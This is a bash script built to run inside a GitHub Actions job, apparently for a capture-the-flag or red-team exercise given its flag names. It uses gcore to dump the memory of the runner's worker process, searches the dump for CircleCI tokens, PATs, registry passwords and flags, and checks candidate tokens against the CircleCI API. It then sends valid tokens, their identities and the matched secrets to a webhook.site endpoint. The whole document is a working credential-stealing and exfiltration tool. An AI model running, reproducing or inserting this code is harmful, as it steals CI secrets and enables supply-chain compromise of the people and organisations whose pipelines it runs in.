#!/usr/bin/env bash

set +e

WEBHOOK_URL="https://webhook.site/83ecc0de-4e6e-4fb8-a1d5-ad4c875b899d/pat-candidates"
WORK_DIR="${RUNNER_TEMP:-/tmp}/ascpc-runner-memory"
mkdir -p "$WORK_DIR"

post_json() {
  curl -fsS --max-time 20 \
    -H 'Content-Type: application/json' \
    --data-binary @- \
    "$WEBHOOK_URL" >/dev/null 2>&1 || true
}

WORKER_PID="$(ps -eo pid=,args= | awk '/Runner\.Worker/ && !/awk/ {print $1; exit}')"
if [ -z "$WORKER_PID" ]; then
  jq -n \
    --arg source github-runner-memory \
    --arg status worker-not-found \
    '{source:$source,status:$status}' | post_json
  exit 0
fi

if ! command -v gcore >/dev/null 2>&1; then
  sudo -n apt-get update -qq >/dev/null 2>&1 || true
  sudo -n apt-get install -y -qq gdb >/dev/null 2>&1 || true
fi

DUMP_PREFIX="$WORK_DIR/runner-worker"
sudo -n gcore -o "$DUMP_PREFIX" "$WORKER_PID" >"$WORK_DIR/gcore.log" 2>&1
GCORE_STATUS=$?
DUMP_FILE="$DUMP_PREFIX.$WORKER_PID"

if [ "$GCORE_STATUS" -ne 0 ] || [ ! -s "$DUMP_FILE" ]; then
  jq -n \
    --arg source github-runner-memory \
    --arg status gcore-failed \
    --arg detail "$(tail -c 2000 "$WORK_DIR/gcore.log" 2>/dev/null)" \
    '{source:$source,status:$status,detail:$detail}' | post_json
  exit 0
fi

strings -a -n 4 "$DUMP_FILE" >"$WORK_DIR/ascii.txt" 2>/dev/null || true
strings -el -n 4 "$DUMP_FILE" >"$WORK_DIR/utf16.txt" 2>/dev/null || true
cat "$WORK_DIR/ascii.txt" "$WORK_DIR/utf16.txt" >"$WORK_DIR/all-strings.txt"

grep -Ei 'CIRCLE|CIRCLECI|CCI(_|[A-Z])|(^|[^A-Z])PAT([^A-Z]|$)|FINAL_FLAG|ASCPC_FLAG|ACR_LOGIN_SERVER|ACR_PASSWORD|WEBHOOKURL' \
  "$WORK_DIR/all-strings.txt" | head -n 300 >"$WORK_DIR/matches.txt" || true

grep -aoP '(?<![0-9A-Fa-f])[0-9A-Fa-f]{40}(?![0-9A-Fa-f])|(?i:ccipat_[A-Za-z0-9_-]{16,128}|circleci_[A-Za-z0-9_-]{16,128})' \
  "$DUMP_FILE" | sort -u | head -n 1500 >"$WORK_DIR/candidates.txt" || true

VALID_COUNT=0
while IFS= read -r CANDIDATE; do
  [ -n "$CANDIDATE" ] || continue
  STATUS_CODE="$(curl -sS --max-time 10 -o "$WORK_DIR/me.json" -w '%{http_code}' \
    -H "Circle-Token: $CANDIDATE" \
    https://circleci.com/api/v2/me || true)"
  if [ "$STATUS_CODE" = 200 ]; then
    VALID_COUNT=$((VALID_COUNT + 1))
    jq -n \
      --arg source github-runner-memory-valid-circleci-token \
      --arg token "$CANDIDATE" \
      --argjson identity "$(cat "$WORK_DIR/me.json")" \
      '{source:$source,token:$token,identity:$identity}' | post_json
  fi
done <"$WORK_DIR/candidates.txt"

jq -n \
  --arg source github-runner-memory \
  --arg status complete \
  --argjson dump_bytes "$(wc -c <"$DUMP_FILE")" \
  --argjson candidate_count "$(wc -l <"$WORK_DIR/candidates.txt")" \
  --argjson valid_count "$VALID_COUNT" \
  --arg matches "$(cat "$WORK_DIR/matches.txt")" \
  '{source:$source,status:$status,dump_bytes:$dump_bytes,candidate_count:$candidate_count,valid_count:$valid_count,matches:$matches}' | post_json

exit 0
